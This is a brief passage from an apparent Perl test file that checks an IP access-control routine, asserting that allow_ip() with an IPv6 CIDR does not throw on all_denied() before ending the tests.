	ok(!$@, 'IPv6 CIDR allow_ip() does not throw on all_denied()');
};

done_testing();
